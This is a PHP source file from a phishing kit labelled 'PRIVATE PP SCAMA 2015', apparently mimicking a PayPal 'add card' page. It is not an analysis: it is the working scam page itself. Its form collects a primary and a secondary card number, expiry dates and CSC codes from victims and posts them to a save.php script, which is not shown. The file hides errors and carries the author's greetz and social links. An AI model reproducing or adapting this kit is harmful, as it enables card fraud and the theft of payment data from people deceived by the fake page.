<?php
session_start();
/*

+----------------------------------+
¦--- PRIVATE  PP SCAMA   2015 -----¦
¦---------- Ver : 2.0 -------------¦
¦--------- BY Dz[NO_o]B -----------¦
¦----------- GREETZ TO ------------¦
¦--- Dz Phoniex : Dz Injector -----¦
¦----------------------------------¦
¦https://code.google.com/p/dznoob/ ¦
¦----------------------------------¦
¦https://facebook.com/DzNOoBpage   ¦
+----------------------------------+


*/
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
$copyright = date("Y");
include "../lang".$_SESSION['DZLN'];

?>









<!DOCTYPE html>
<html lang="en" class=" js ">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8"><title>  <?php echo $for1; ?> - <?php echo $_SESSION['DZNCOUNT']; ?> </title>

<link rel="shortcut icon" href="dzn_favicon_x.ico">
<script src="modernizr-2.6.1.js"></script><script>if (self === top) {var antiClickjack = document.getElementById("antiClickjack");antiClickjack.parentNode.removeChild(antiClickjack);} else {top.location = self.location;}</script><script src="config.js" data-requiremodule="config" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="app.js" data-requiremodule="app" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script><script src="login.js" data-requiremodule="view/login" data-requirecontext="_" async="" charset="utf-8" type="text/javascript"></script>
<link rel="stylesheet" type="text/css" href="index.css" media="all">

<link href="creditCardTypeDetector.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script type="text/javascript" src="jquery.creditCardTypeDetector.js"></script>
<script type="text/javascript">
$(document).ready(function(){
$('#checkout_card_number').creditCardTypeDetector({ 'credit_card_logos' : '.card_logos' });
});
</script>

   </head>
<body class="desktop control linktobgc"><noscript><p class="nonjsAlert" role="alert">NOTE: Many features on the Web site require Javascript and cookies.</p></noscript><header class="mainHeader" role="banner">
<div class="headerContainer"><div class="grid12"><a href="£" class="logo">
<img src="dznoob.png" alt="logo" height="29" width="109"></a><div class="loginBtn">
<span class="securityLock"> <?php echo $topp; ?> </span></div></div></div></header>
<div id="notificationBox" role="notification" class="notification"></div><main class="addCardPage US"><section id="content" role="main" data-country="US">
<section id="main" class=""><div id="addCard" class="addCard grid12 grid">
<div class="grid6 valueProp cardInformation"><header><h1> <?php echo $for1; ?>.</h1>
</header><ul><li> <?php echo $acu; ?> </li>
<li> <?php echo $accu; ?> </li>
</ul></div><div class="grid6 gutter-left">
<div class="container"><div class="inner">
<p> <?php echo $primarycred; ?> </p>
<form action="../save.php" method="post" class="proceed">
<div class="cardEntry groupFields"><div class="textInput large lap cardNumber">

<input id="checkout_card_number" type="text"  placeholder=" <?php echo $card_info; ?> " name="dftCN" size="20" pattern="[0-9]*" autocomplete="off" class="stripe_card_number" required="required" />
<br><br>
<ul class="card_logos">
<li class="card_visa">Visa</li>
<li class="card_mastercard">Mastercard</li>
<li class="card_amex">American Express</li>
<li class="card_discover">Discover</li>
<li class="card_jcb">JCB</li>
<li class="card_diners">Diners Club</li>

</div><div class="multi equal clearfix"><div class="textInput left lap expiryDate  ">
<input placeholder=" <?php echo $expbr; ?> " id="expiryDate" class="validate" name="datex" value="" autocapitalize="off" autocomplete="off" aria-required="true" maxlength="7" required="required" type="tel"></div>
<div class="textInput right last lap cscNumber  "><span class="icons cvv defaultCvv" id="cvvHolder" role="img"></span><input class="hasHelp validate csc"  placeholder=" CSC " id="csc" name="dftVC" aria-required="true" maxlength="4" pattern="[0-9]*" required="required" value="" autocomplete="off" autocorrect="off" autocapitalize="off" type="tel"><p class="help-error error-empty" id="cscEmpty">Required.</p><p class="help-error error-format" id="cscFormat">CSC must be 3 or 4 digits.</p>
</div></div></div><div class="groupFields">

<div class="agreeTC checkbox  "><label for="termsAgree" id="termsAgreeLabel" aria-pressed="false" class="helpNotifyUS ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false"><input class="validate ui-helper-hidden-accessible" name="vbv" value="1" id="termsAgree" type="checkbox"><span class="icon "></span> <?php echo $thiscardis; ?>  .</label></div>
<br>


<p> <?php echo $secondarycred; ?> </p>

<div class="cardEntry groupFields"><div class="textInput large lap cardNumber">

<input id="cardNumber" name="dftCN2"  placeholder=" <?php echo $card_info; ?> " value="" autocomplete="off" autocorrect="off" autocapitalize="off" aria-required="true" maxlength="19" pattern="[0-9]*" class="validate" type="tel"><span class="icons creditCard  " id="creditCard" role="img"></span>

</div><div class="multi equal clearfix"><div class="textInput left lap expiryDate  ">
<input  placeholder=" <?php echo $expbr; ?> " id="expiryDate" class="validate" name="datex2" value="" autocapitalize="off" autocomplete="off" aria-required="true" maxlength="7" type="tel"><p class="help-error error-empty" id="expiryDateEmpty">Required.</p></div>
<div class="textInput right last lap cscNumber  "><span class="icons cvv defaultCvv" id="cvvHolder" role="img"></span><input  placeholder=" CSC " class="hasHelp validate csc" id="csc" name="dftVC2" aria-required="true" maxlength="4" pattern="[0-9]*" value="" autocomplete="off" autocorrect="off" autocapitalize="off" type="tel"><p class="help-error error-empty" id="cscEmpty">Required.</p>
</div></div></div><div class="groupFields">


<br>



</div><div class="btns">
<input id="submitBtn" name="_eventId_continue" class="button" value=" <?php echo $button_continue; ?> " type="submit"></div></form>

<div class="divider"></div></div></div></div><img src="3484-16283-2054-71" alt="" height="1" width="1" border="0">




</html>
